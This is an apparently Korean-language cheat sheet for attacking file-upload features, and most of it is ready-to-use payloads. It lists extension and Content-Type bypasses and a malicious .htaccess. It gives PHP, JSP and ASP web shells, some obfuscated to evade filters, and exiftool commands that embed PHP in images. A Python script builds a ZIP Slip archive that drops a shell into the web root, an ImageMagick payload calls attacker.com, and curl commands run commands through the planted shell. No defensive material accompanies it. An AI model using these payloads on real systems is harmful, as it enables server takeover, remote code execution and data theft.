# 파일 업로드 취약점 — 우회 기법

## 확장자 우회
```
# PHP 실행 확장자
.php .php3 .php4 .php5 .php7 .php8
.phtml .pht .phps .phar .shtml
.PHP .PhP .pHp (대소문자)

# ASP 실행 확장자
.asp .aspx .asa .ashx .asmx .axd .cshtml .vbhtml

# JSP
.jsp .jspx .jsw .jsv .jspf

# 이중 확장자
shell.php.jpg  → 서버가 뒤 확장자 무시
shell.jpg.php  → 앞 Content-Type만 검사

# Null byte (구버전 PHP)
shell.php%00.jpg
shell.php\x00.jpg

# 경로 탐색 포함
../shell.php
....//shell.php

# 특수문자
shell.php;.jpg
shell.php:.jpg (Windows ADS)
shell.php/
shell.php.
```

## Content-Type 우회
```
# 정상 Content-Type으로 전송
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Magic Bytes 조작 (파일 헤더)
GIF89a<?php system($_GET['c']); ?>
# → GIF 시그니처 + PHP 코드

# JPEG 헤더
FF D8 FF E0  (JPEG 시작)
이후 PHP 코드 삽입 → exiftool로 메타데이터에 삽입도 가능
```

## .htaccess 업로드 (Apache)
```apache
# 모든 파일을 PHP로 실행
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
Options +ExecCGI
AddHandler cgi-script .jpg

# PHP 실행 허용
php_flag engine on
```

## 웹쉘 페이로드
```php
# 기본
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['c']); ?>
<?php echo shell_exec($_POST['e']); ?>
<?php eval($_POST['code']); ?>

# 난독화 (필터 우회)
<?php $f='sys'.'tem';$f($_GET[0]); ?>
<?php $a=base64_decode('c3lzdGVt');$a($_GET[0]); ?>
<?php @preg_replace('/e/e','@'.$_POST[0],'e'); ?>

# Chopper 웹쉘 (AES 암호화)
<?php @eval($_POST['pass']);?>

# JSP 웹쉘
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<%=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")}).text()%>

# ASP 웹쉘
<%eval request("cmd")%>
<% Set oScript = Server.CreateObject("WSCRIPT.SHELL") %>
<% Call oScript.Run("cmd.exe /c " & request("cmd"),0,true) %>
```

## 이미지 트리킹 (이미지 파일에 PHP 삽입)
```bash
# ExifTool로 메타데이터에 삽입
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
exiftool -Artist='<?php system($_GET[0]); ?>' image.png

# 파일 연결
cat image.jpg shell.php > shell.jpg
```

## ZIP Slip (압축 파일)
```python
# path traversal을 포함한 ZIP 파일 생성
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.write('shell.php', '../../var/www/html/shell.php')
    # 압축 해제 시 웹 루트에 shell.php 생성
```

## ImageMagick CVE (Ghostscript)
```
# ImageMagick 처리 시 RCE
# 악성 MVG 파일
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/|id; echo)'
pop graphic-context
```

## 업로드 후 경로 파악
```bash
# 일반적인 업로드 경로
/uploads/
/upload/
/files/
/file/
/media/
/images/
/img/
/assets/
/static/
/content/
/tmp/
/temp/

# 응답 분석
Location: /uploads/shell.php
"url": "/media/shell.jpg"
"path": "uploads/2024/shell.php"

# 파일명 변조 확인 (UUID, MD5 등)
# 업로드 전후 비교
```

## 실행 확인
```bash
# 직접 접근
curl "https://target/uploads/shell.php?cmd=id"

# 웹쉘 인터랙티브
curl "https://target/uploads/shell.php" -d "cmd=ls -la"
```
